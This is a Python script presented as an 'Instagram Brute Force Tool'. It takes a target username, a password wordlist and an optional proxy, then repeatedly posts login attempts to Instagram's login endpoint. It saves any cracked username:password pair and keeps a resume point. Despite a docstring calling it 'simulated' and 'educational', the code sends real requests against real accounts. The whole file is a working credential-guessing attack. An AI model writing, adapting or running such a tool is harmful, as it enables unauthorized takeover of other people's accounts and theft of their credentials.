import requests
import time
import sys
import os
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

SUCCESS_FILE = "success.txt"
LOG_FILE = "bruteforce.log"
RESUME_FILE = "resume.txt"

# --- Set your access password here ---
#ACCESS_PASSWORD = "blackwacker2025"

#def check_access_password():
#    for _ in range(3):  # allow 3 attempts
#        entered = input(Fore.YELLOW + "Enter access password to start: " + Fore.WHITE).strip()
#        if entered == ACCESS_PASSWORD:
#            print(Fore.GREEN + "[Access granted]\n")
#            return True
#        else:
#            print(Fore.RED + "[Wrong password! Try again.]")
#    print(Fore.RED + "Too many failed attempts. Exiting.")
#    sys.exit(1)

def save_success(username, password):
    with open(SUCCESS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{username}:{password}\n")

def save_resume(line_num):
    with open(RESUME_FILE, "w", encoding="utf-8") as f:
        f.write(str(line_num))

def read_resume():
    if os.path.exists(RESUME_FILE):
        try:
            with open(RESUME_FILE, "r", encoding="utf-8") as f:
                return int(f.read().strip())
        except:
            return 0
    return 0

def log(message):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(message + "\n")

def try_login(username, password, proxy=None):
    """
    Simulated Instagram login request (educational).
    """

    url = "https://www.instagram.com/accounts/login/ajax/"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
	"X-CSRFToken": "58TDq2Aho7q_uNaXZ3JDZu",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false"
    }

    proxies = None
    if proxy:
        proxies = {
            "http": proxy,
            "https": proxy
        }

    try:
        response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=10)
        json_resp = response.json()

        if json_resp.get("authenticated") == True:
            return True, json_resp
        elif json_resp.get("message") == "checkpoint_required":
            log(f"[-] Account {username} requires checkpoint verification.")
            return False, "checkpoint_required"
        elif "error" in json_resp:
            log(f"[-] Error: {json_resp['error']}")
            return False, "error"
        else:
            return False, json_resp
    except Exception as e:
        log(f"[-] Request error: {e}")
        return False, "exception"

def print_banner():
    print(Fore.CYAN + Style.BRIGHT + """
██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗ ███████╗███████╗
██╔════╝██╔═══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔════╝
██║     ██║   ██║██║   ██║   ██║   █████╗  ██████╔╝█████╗  █████╗  
██║     ██║   ██║██║   ██║   ██║   ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝  
╚██████╗╚██████╔╝╚██████╔╝   ██║   ███████╗██║  ██║███████╗███████╗
 ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝

     Blackwacker DV Academy
     Developer: Pouya Fakham
""" + Style.RESET_ALL)

def get_input(prompt, required=True):
    while True:
        val = input(Fore.YELLOW + prompt + Fore.WHITE + " ").strip()
        if val or not required:
            return val
        else:
            print(Fore.RED + "[!] This field is required.")

def main():
#    check_access_password()

    print_banner()

    print(Fore.GREEN + "Welcome to Instagram Brute Force Tool - Advanced Version")
    print(Fore.GREEN + "Please enter the required information below:")

    username = get_input("Target Instagram username:")
    wordlist_path = get_input("Path to password wordlist file:")
    proxy = get_input("Proxy (optional, format http://ip:port):", required=False)
    delay_input = get_input("Delay between attempts in seconds (default 1):", required=False)
    delay = float(delay_input) if delay_input else 1.0

    if not os.path.exists(wordlist_path):
        print(Fore.RED + "[!] Wordlist file not found. Exiting.")
        sys.exit(1)

    start_line = read_resume()
    print(Fore.YELLOW + f"[i] Resuming from line {start_line} in wordlist.")

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as file:
        lines = file.readlines()

    total_lines = len(lines)

    try:
        for i in range(start_line, total_lines):
            password = lines[i].strip()
            print(Fore.WHITE + f"[~] Trying password: {password}")

            success, resp = try_login(username, password, proxy=proxy)

            if success:
                print(Fore.GREEN + f"[+] Password found: {password}")
                save_success(username, password)
                if os.path.exists(RESUME_FILE):
                    os.remove(RESUME_FILE)
                break
            else:
                if resp == "checkpoint_required":
                    print(Fore.RED + "[!] Account requires checkpoint verification. Stopping.")
                    log(f"Checkpoint on {username}")
                    break
                elif resp == "exception":
                    print(Fore.RED + "[!] Request error. Waiting 5 seconds before retrying.")
                    time.sleep(5)
                    continue
                else:
                    print(Fore.YELLOW + "[!] Incorrect password.")

            save_resume(i + 1)
            time.sleep(delay)
        else:
            print(Fore.RED + "[!] Password not found in wordlist.")

    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user. Saving progress and exiting.")
        save_resume(i)
        sys.exit(0)

if __name__ == "__main__":
    main()
